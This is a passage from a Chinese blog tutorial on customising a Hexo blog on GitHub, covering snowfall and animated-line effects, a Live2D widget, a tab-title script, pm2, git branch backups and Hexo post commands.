<span class="attr">opacity</span>: startOpacity,</span><br><span class="line">        <span class="string">'font-size'</span>: sizeFlake,</span><br><span class="line">        <span class="attr">color</span>: options.flakeColor</span><br><span class="line">    }).animate({</span><br><span class="line">        <span class="attr">top</span>: endPositionTop,</span><br><span class="line">        <span class="attr">left</span>: endPositionLeft,</span><br><span class="line">        <span class="attr">opacity</span>: <span class="number">0.2</span></span><br><span class="line">    },durationFall,<span class="string">'linear'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">        $(<span class="built_in">this</span>).remove()</span><br><span class="line">    });</span><br><span class="line">    }, options.newOn);</span><br><span class="line">    };</span><br><span class="line">})(jQuery);</span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">    $.fn.snow({ </span><br><span class="line">        <span class="attr">minSize</span>: <span class="number">5</span>, <span class="comment">/* 定义雪花最小尺寸 */</span></span><br><span class="line">        <span class="attr">maxSize</span>: <span class="number">50</span>,<span class="comment">/* 定义雪花最大尺寸 */</span></span><br><span class="line">        <span class="attr">newOn</span>: <span class="number">300</span>  <span class="comment">/* 定义密集程度，数字越小越密集 */</span></span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"><span class="comment">/*样式二*/</span></span><br><span class="line"><span class="comment">/* 控制下雪 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">snowFall</span>(<span class="params">snow</span>) </span>{</span><br><span class="line">    <span class="comment">/* 可配置属性 */</span></span><br><span class="line">    snow = snow || {};</span><br><span class="line">    <span class="built_in">this</span>.maxFlake = snow.maxFlake || <span class="number">200</span>;   <span class="comment">/* 最多片数 */</span></span><br><span class="line">    <span class="built_in">this</span>.flakeSize = snow.flakeSize || <span class="number">10</span>;  <span class="comment">/* 雪花形状 */</span></span><br><span class="line">    <span class="built_in">this</span>.fallSpeed = snow.fallSpeed || <span class="number">1</span>;   <span class="comment">/* 坠落速度 */</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 兼容写法 */</span></span><br><span class="line">requestAnimationFrame = <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>{ <span class="built_in">setTimeout</span>(callback, <span class="number">1000</span> / <span class="number">60</span>); };</span><br><span class="line"></span><br><span class="line">cancelAnimationFrame = <span class="built_in">window</span>.cancelAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozCancelAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitCancelAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msCancelAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oCancelAnimationFrame;</span><br><span class="line"><span class="comment">/* 开始下雪 */</span></span><br><span class="line">snowFall.prototype.start = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="comment">/* 创建画布 */</span></span><br><span class="line">    snowCanvas.apply(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">/* 创建雪花形状 */</span></span><br><span class="line">    createFlakes.apply(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">/* 画雪 */</span></span><br><span class="line">    drawSnow.apply(<span class="built_in">this</span>)</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 创建画布 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">snowCanvas</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="comment">/* 添加Dom结点 */</span></span><br><span class="line">    <span class="keyword">var</span> snowcanvas = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>);</span><br><span class="line">    snowcanvas.id = <span class="string">"snowfall"</span>;</span><br><span class="line">    snowcanvas.width = <span class="built_in">window</span>.innerWidth;</span><br><span class="line">    snowcanvas.height = <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">    snowcanvas.setAttribute(<span class="string">"style"</span>, <span class="string">"position:absolute; top: 0; left: 0; z-index: 1; pointer-events: none;"</span>);</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(snowcanvas);</span><br><span class="line">    <span class="built_in">this</span>.canvas = snowcanvas;</span><br><span class="line">    <span class="built_in">this</span>.ctx = snowcanvas.getContext(<span class="string">"2d"</span>);</span><br><span class="line">    <span class="comment">/* 窗口大小改变的处理 */</span></span><br><span class="line">    <span class="built_in">window</span>.onresize = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">        snowcanvas.width = <span class="built_in">window</span>.innerWidth;</span><br><span class="line">        <span class="comment">/* snowcanvas.height = window.innerHeight */</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 雪运动对象 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flakeMove</span>(<span class="params">canvasWidth, canvasHeight, flakeSize, fallSpeed</span>) </span>{</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * canvasWidth);   <span class="comment">/* x坐标 */</span></span><br><span class="line">    <span class="built_in">this</span>.y = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * canvasHeight);  <span class="comment">/* y坐标 */</span></span><br><span class="line">    <span class="built_in">this</span>.size = <span class="built_in">Math</span>.random() * flakeSize + <span class="number">2</span>;          <span class="comment">/* 形状 */</span></span><br><span class="line">    <span class="built_in">this</span>.maxSize = flakeSize;                           <span class="comment">/* 最大形状 */</span></span><br><span class="line">    <span class="built_in">this</span>.speed = <span class="built_in">Math</span>.random() * <span class="number">1</span> + fallSpeed;         <span class="comment">/* 坠落速度 */</span></span><br><span class="line">    <span class="built_in">this</span>.fallSpeed = fallSpeed;                         <span class="comment">/* 坠落速度 */</span></span><br><span class="line">    <span class="built_in">this</span>.velY = <span class="built_in">this</span>.speed;                             <span class="comment">/* Y方向速度 */</span></span><br><span class="line">    <span class="built_in">this</span>.velX = <span class="number">0</span>;                                      <span class="comment">/* X方向速度 */</span></span><br><span class="line">    <span class="built_in">this</span>.stepSize = <span class="built_in">Math</span>.random() / <span class="number">30</span>;                 <span class="comment">/* 步长 */</span></span><br><span class="line">    <span class="built_in">this</span>.step = <span class="number">0</span>                                       <span class="comment">/* 步数 */</span></span><br><span class="line">}</span><br><span class="line">flakeMove.prototype.update = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">this</span>.x,</span><br><span class="line">        y = <span class="built_in">this</span>.y;</span><br><span class="line">    <span class="comment">/* 左右摆动(余弦) */</span></span><br><span class="line">    <span class="built_in">this</span>.velX *= <span class="number">0.98</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.velY &lt;= <span class="built_in">this</span>.speed) {</span><br><span class="line">        <span class="built_in">this</span>.velY = <span class="built_in">this</span>.speed</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">this</span>.velX += <span class="built_in">Math</span>.cos(<span class="built_in">this</span>.step += <span class="number">.05</span>) * <span class="built_in">this</span>.stepSize;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.y += <span class="built_in">this</span>.velY;</span><br><span class="line">    <span class="built_in">this</span>.x += <span class="built_in">this</span>.velX;</span><br><span class="line">    <span class="comment">/* 飞出边界的处理 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.x &gt;= canvas.width || <span class="built_in">this</span>.x &lt;= <span class="number">0</span> || <span class="built_in">this</span>.y &gt;= canvas.height || <span class="built_in">this</span>.y &lt;= <span class="number">0</span>) {</span><br><span class="line">        <span class="built_in">this</span>.reset(canvas.width, canvas.height)</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"><span class="comment">/* 飞出边界-放置最顶端继续坠落 */</span></span><br><span class="line">flakeMove.prototype.reset = <span class="function"><span class="keyword">function</span>(<span class="params">width, height</span>) </span>{</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * width);</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.size = <span class="built_in">Math</span>.random() * <span class="built_in">this</span>.maxSize + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">this</span>.speed = <span class="built_in">Math</span>.random() * <span class="number">1</span> + <span class="built_in">this</span>.fallSpeed;</span><br><span class="line">    <span class="built_in">this</span>.velY = <span class="built_in">this</span>.speed;</span><br><span class="line">    <span class="built_in">this</span>.velX = <span class="number">0</span>;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 渲染雪花-随机形状（此处可修改雪花颜色！！！）</span></span><br><span class="line">flakeMove.prototype.render = <span class="function"><span class="keyword">function</span>(<span class="params">ctx</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> snowFlake = ctx.createRadialGradient(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y, <span class="number">0</span>, <span class="built_in">this</span>.x, <span class="built_in">this</span>.y, <span class="built_in">this</span>.size);</span><br><span class="line">    snowFlake.addColorStop(<span class="number">0</span>, <span class="string">"rgba(255, 255, 255, 0.9)"</span>);  <span class="comment">/* 此处是雪花颜色，默认是白色 */</span></span><br><span class="line">    snowFlake.addColorStop(<span class="number">.5</span>, <span class="string">"rgba(255, 255, 255, 0.5)"</span>); <span class="comment">/* 若要改为其他颜色，请自行查 */</span></span><br><span class="line">    snowFlake.addColorStop(<span class="number">1</span>, <span class="string">"rgba(255, 255, 255, 0)"</span>);    <span class="comment">/* 找16进制的RGB 颜色代码。 */</span></span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.fillStyle = snowFlake;</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y, <span class="built_in">this</span>.size, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>);</span><br><span class="line">    ctx.fill();</span><br><span class="line">    ctx.restore();</span><br><span class="line">};</span><br><span class="line"><span class="comment">/* 创建雪花-定义形状 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createFlakes</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> maxFlake = <span class="built_in">this</span>.maxFlake,</span><br><span class="line">        flakes = <span class="built_in">this</span>.flakes = [],</span><br><span class="line">        canvas = <span class="built_in">this</span>.canvas;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; maxFlake; i++) {</span><br><span class="line">        flakes.push(<span class="keyword">new</span> flakeMove(canvas.width, canvas.height, <span class="built_in">this</span>.flakeSize, <span class="built_in">this</span>.fallSpeed))</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 画雪 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">drawSnow</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> maxFlake = <span class="built_in">this</span>.maxFlake,</span><br><span class="line">        flakes = <span class="built_in">this</span>.flakes;</span><br><span class="line">    ctx = <span class="built_in">this</span>.ctx, canvas = <span class="built_in">this</span>.canvas, that = <span class="built_in">this</span>;</span><br><span class="line">    <span class="comment">/* 清空雪花 */</span></span><br><span class="line">    ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="number">0</span>; e &lt; maxFlake; e++) {</span><br><span class="line">        flakes[e].update();</span><br><span class="line">        flakes[e].render(ctx);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/*  一帧一帧的画 */</span></span><br><span class="line">    <span class="built_in">this</span>.loop = requestAnimationFrame(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">        drawSnow.apply(that);</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 调用及控制方法 */</span></span><br><span class="line"><span class="keyword">var</span> snow = <span class="keyword">new</span> snowFall({<span class="attr">maxFlake</span>:<span class="number">60</span>});</span><br><span class="line">snow.start();</span><br></pre></td></tr></tbody></table></figure><p>然后在themes/_config里libs.js.下面添加一行：</p><p><code>snow: /libs/others/snow.js</code></p><p>然后在 \themes\hexo-theme-hiero\layout\layout.ejs 文件里引用即可：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 雪花特效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"\js\snow.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>最后在themes/_config添加：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 雪花特效</span></span><br><span class="line"><span class="attr">snow:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/b7f849a0b12945a0b6f2c107da9a5ba8.png"></p><h3 id="添加动漫人物挂件"><a href="#添加动漫人物挂件" class="headerlink" title="添加动漫人物挂件"></a>添加动漫人物挂件</h3><p>方法：</p><ol><li>获取模型：</li></ol><p>npm install –save hexo-helper-live2d<br>2. 安装喜欢的模型：</p><p>npm install packagename<br>将packagename换成模型名字：</p><p>npm install  live2d-widget-model-hibiki</p><p>模型预览：<a href="https://link.zhihu.com/?target=https://github.com/xiazeyu/live2d-widget-models">live2d-widget-models</a> GitHub项目地址：<a href="https://link.zhihu.com/?target=https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a></p><ol start="3"><li>然后打开博客根目录下的 _config.yml文件，添加如下代码：</li></ol><p>方案一：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">      <span class="attr">model:</span></span><br><span class="line">        <span class="attr">use:</span> <span class="string">live2d-widget-model-hibiki</span> <span class="comment">#模型选择</span></span><br><span class="line">      <span class="attr">display:</span></span><br><span class="line">        <span class="attr">position:</span> <span class="string">right</span>  <span class="comment">#模型位置</span></span><br><span class="line">        <span class="attr">width:</span> <span class="number">150</span>   <span class="comment">#模型宽度</span></span><br><span class="line">        <span class="attr">height:</span> <span class="number">300</span>  <span class="comment">#模型高度</span></span><br><span class="line">      <span class="attr">mobile:</span></span><br><span class="line">        <span class="attr">show:</span> <span class="literal">false</span>  <span class="comment">#是否在手机端显示</span></span><br></pre></td></tr></tbody></table></figure><p>方案二：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-hibiki</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><h3 id="浏览器网页标题"><a href="#浏览器网页标题" class="headerlink" title="浏览器网页标题"></a>浏览器网页标题</h3><ol><li>在 \themes\matery\source\js 下新建一个 FunnyTitle.js 文件，填写如下代码：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器搞笑标题</span></span><br><span class="line"><span class="keyword">var</span> OriginTitle = <span class="built_in">document</span>.title;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) {</span><br><span class="line">        $(<span class="string">'[rel="icon"]'</span>).attr(<span class="string">'href'</span>, <span class="string">"/funny.ico"</span>);</span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">'╭(°A°`)╮ 页面崩溃啦 ~'</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        $(<span class="string">'[rel="icon"]'</span>).attr(<span class="string">'href'</span>, <span class="string">"/favicon.ico"</span>);</span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">'(ฅ&gt;ω&lt;*ฅ) 噫又好啦 ~'</span> + OriginTitle;</span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">            <span class="built_in">document</span>.title = OriginTitle;</span><br><span class="line">        }, <span class="number">2000</span>);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>在 \themes\matery\layout\layout.ejs 文件中添加如下代码：</li></ol><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--浏览器搞笑标题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/FunnyTitle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="添加动态线条"><a href="#添加动态线条" class="headerlink" title="添加动态线条"></a>添加动态线条</h3><blockquote><p>会根据鼠标点击自动汇聚为一个圆</p></blockquote><p>使用方法在 ：/Hexo/themes/matery/layout/layout.ejs文件中body前添加如下代码：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--动态线条背景--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span></span></span><br><span class="line"><span class="tag"><span class="attr">color</span>=<span class="string">"220,220,220"</span> <span class="attr">opacity</span>=<span class="string">'0.7'</span> <span class="attr">zIndex</span>=<span class="string">"-2"</span> <span class="attr">count</span>=<span class="string">"200"</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><ul><li>color：表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）</li><li>opacity：表示线条透明度（0~1），默认：0.5</li><li>count：表示线条的总数量，默认：150</li><li>zIndex：表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1</li></ul><h3 id="博客名称溢出"><a href="#博客名称溢出" class="headerlink" title="博客名称溢出"></a>博客名称溢出</h3><p>解决办法：在matery.css中添加以下代码。不懂css的注意位置(第六行后面)</p>   <figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">header</span> <span class="selector-class">.brand-logo</span> <span class="selector-class">.logo-img</span>{</span><br><span class="line">        <span class="attribute">display</span>: none;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="hexo博客出现无法加载“hexo-prism-plugin”"><a href="#hexo博客出现无法加载“hexo-prism-plugin”" class="headerlink" title="hexo博客出现无法加载“hexo-prism-plugin”"></a>hexo博客出现无法加载“hexo-prism-plugin”</h3><p>博客目录下的配置文件中打开，将以下代码放在最后即可</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">prism_plugin:</span></span><br><span class="line">  <span class="attr">mode:</span> <span class="string">'preprocess'</span> <span class="comment"># realtime/preprocess</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">'default'</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">false</span> <span class="comment"># default false</span></span><br></pre></td></tr></tbody></table></figure><h3 id="linux后台运行Hexo"><a href="#linux后台运行Hexo" class="headerlink" title="linux后台运行Hexo"></a>linux后台运行Hexo</h3><ol><li>安装pm2</li></ol><p><code>npm install -g pm2</code></p><ol start="2"><li>在博客根目录写一个名为hexo_run.js的脚本<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//run</span></span><br><span class="line"><span class="keyword">const</span> { exec } = <span class="built_in">require</span>(<span class="string">'child_process'</span>)</span><br><span class="line">exec(<span class="string">'hexo server'</span>,<span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span>(error){</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'exec error: ${error}'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'stdout: ${stdout}'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'stderr: ${stderr}'</span>);</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure></li><li>到博客根目录运行脚本<br><code>pm2 start hexo_run.js</code></li></ol><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">pm2的相关命令</span><br><span class="line">pm2 <span class="built_in">start</span> hexo_run.js<span class="comment">#启动</span></span><br><span class="line">pm2 list<span class="comment">#查看pm2管理的所有服务</span></span><br><span class="line"></span><br><span class="line">pm2 <span class="built_in">stop</span> all<span class="comment">#停止pm2列表的所有服务</span></span><br><span class="line">pm2 <span class="built_in">stop</span> <span class="number">0</span> <span class="comment">#停止进程为0的进程</span></span><br><span class="line"></span><br><span class="line">pm2 reload all <span class="comment">#重新载入列表所有进程</span></span><br><span class="line">pm2 reload <span class="number">0</span> <span class="comment">#重载列表中进程为0的进程</span></span><br><span class="line"></span><br><span class="line">pm2 restart all<span class="comment">#重启列表中所有的进程</span></span><br><span class="line">pm2 restart <span class="number">0</span><span class="comment">#重启列表中进程为0的进程</span></span><br><span class="line"></span><br><span class="line">pm2 <span class="built_in">delete</span> <span class="number">0</span><span class="comment">#删除列表中进程为0的进程</span></span><br><span class="line">pm2 <span class="built_in">delete</span> all<span class="comment">#删除列表中所有的进程</span></span><br></pre></td></tr></tbody></table></figure><h2 id="05-利用git实现多地更新"><a href="#05-利用git实现多地更新" class="headerlink" title="05 利用git实现多地更新"></a>05 利用git实现多地更新</h2><ul><li>利用github分支实现</li><li>hexo生成的静态博客文件默认放在main(master)分支</li><li>hexo的源文件（部署环境文件）可以都放在hexo分支上（可以新创建一个hexo分支），换新电脑时，直接git clone hexo分支</li></ul><h3 id="hexo搭建博客原理"><a href="#hexo搭建博客原理" class="headerlink" title="hexo搭建博客原理"></a>hexo搭建博客原理</h3><ul><li>hexo帮助把博客发送到github，同时把md文件转换成网页文件</li><li>hexo目录下的文件和github上的文件是不</li></ul><h3 id="搭建hexo服务器端电脑设置"><a href="#搭建hexo服务器端电脑设置" class="headerlink" title="搭建hexo服务器端电脑设置"></a>搭建hexo服务器端电脑设置</h3><ul><li>在Github的username.github.io仓库上新建一个xxx分支，并切换到该分支，并在该仓库-&gt;Settings-&gt;Branches-&gt;Default branch中将默认分支设为xxx，save保存；然后将该仓库克隆到本地，进入该username.github.io文件目录<br><code>git clone -b hexo git@github.com:username/username.github.io.git</code><br>完成上面步骤后，在当前目录使用Git Bash执行git branch命令查看当前所在分支，应为新建的分支xxx：</li></ul><h3 id="拷贝部署文件"><a href="#拷贝部署文件" class="headerlink" title="拷贝部署文件"></a>拷贝部署文件</h3><ul><li><p>如题，先将本地博客的部署文件（Hexo目录下的全部文件）全部拷贝进username.github.io文件目录中去。<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/fb41d46b89e744648d6a445d29ea0db6.png"><br>接下来，进入username.github.io文件目录下，将该目录下的全部文件提交到xxx分支，提交之前需注意：</p></li><li><p>将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，提交主题文件夹会失败。<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/c97c4eeed4494601b674ee285a0a9ac5.png"></p></li><li><p>可能有人会问，删除了themes目录中的.git不就不能git pull更新主题了吗，很简单，需要更新主题时在另一个地方git clone下来该主题的最新版本，然后将内容拷到当前主题目录即可。</p></li></ul><h3 id="提交hexo分支"><a href="#提交hexo分支" class="headerlink" title="提交hexo分支"></a>提交hexo分支</h3><ul><li><p>执行git add .、git commit -m ‘back up hexo files’（引号内容可改）、git push即可将博客的hexo部署环境提交到GitHub个人仓库的xxx分支。</p></li><li><p>切换到username.github.io目录，执行npm install(由于仓库有一个.gitignore文件，里面默认是忽略掉 node_modules文件夹的，也就是说仓库的hexo分支并没有存储该目录[也不需要]，所以需要install下)</p></li></ul><p>现在可以在GitHub上的username.github.io仓库看到两个分支的差异了。<br>master分支和xxx分支各自保存着一个版本，master分支用于保存博客静态资源，提供博客页面供人访问；xxx分支用于备份博客部署文件，供自己维护更新，两者在一个GitHub仓库内互不冲突。</p><ul><li>执行hexo d -g指令（在此之前，有时可能需要执行hexo clean），完成后就会发现，最新改动已经更新到main(master)分支了，两个分支互不干扰</li><li>每次换电脑进行博客更新时，不管上次在其他电脑有没有更新，最好先git pull</li><li>然后将目录切换下username.github.io下，此时需要安装一下npm install， 最后执行hexo g、hexo s、hexo d等命令即可提交成功</li></ul><h2 id="06发布和删除博客"><a href="#06发布和删除博客" class="headerlink" title="06发布和删除博客"></a>06发布和删除博客</h2><h3 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h3><h4 id="撰写文章"><a href="#撰写文章" class="headerlink" title="撰写文章"></a>撰写文章</h4><p>markdown编辑器（如：Typora、Vscode、Joplin、Vnote等）撰写博客</p><h4 id="Hexo文章管理"><a href="#Hexo文章管理" class="headerlink" title="Hexo文章管理"></a>Hexo文章管理</h4><ol><li>创建一个md文件<br>md文件也就是Markdown文件，通过以下命令来创建：</li></ol><figure class="highlight haxe"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> <span class="type"></span>&lt;title&gt;</span><br><span class="line">$ hexo <span class="keyword">new</span> <span class="type"></span>"我的第一篇文章<span class="string">"</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>布局（layout）<br>创建md文件时，我们可以指定布局<figure class="highlight haxe"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> <span class="type"></span>[layout] &lt;title&gt;</span><br><span class="line">$ hexo <span class="keyword">new</span> <span class="type">page</span> <span class="string">"我的页面"</span></span><br></pre></td></tr></tbody></table></figure></li></ol><p>布局有三种：post（文章）、draft（草稿）、page（页面）<br>在新建文件时，Hexo 会根据 scaffolds 文件夹内相对应的文件（可以理解为模板）来建立md文件：<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/377baa064a3f4ecb8c78605546763f9c.png"></p><ul><li>如果没有指定布局类型，则为默认布局post，可以在站点配置文件修改 default_layout 参数来修改默认布局。</li><li>当我们创建不同布局的md文件时，它们会存储在不同路径：<br>post会在source下生成_post文件统一发布<br>draft会在source下生成_draft文件统一发布<br>page则是生成命名的文件并在里面生成一个index.md文件</li></ul><ol start="3"><li>草稿（draft）<br>draft这种布局在建立时会被保存到 source/_drafts 文件夹中，但不会显示在页面上，如果我们不想某一篇文章显示在页面上，那么就可以把它移动到_drafts文件夹中。</li></ol><p>我们可在启动服务器时加上 –draft 参数来查看草稿。<br><code>$ hexo server --draft</code></p><ul><li>还可以在站点配置文件中把 render_drafts 参数设为 true 来预览草稿。</li><li>我们可以通过 publish 命令将草稿发布文章或者页面，它将会被移动到指定的文件夹。<br><code>$ hexo publish [layout] &lt;title&gt;</code></li></ul><ol start="4"><li>Front-matter<br>当我们创建一个md文件后，打开后会看到一些内容，这些称为Front-matter，它是文件最上方以 — 分隔的区域，用于指定个别文件的变量，举例来说：</li></ol><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span> <span class="comment"># 标题就是我们上面创建的时候指定的名字</span></span><br><span 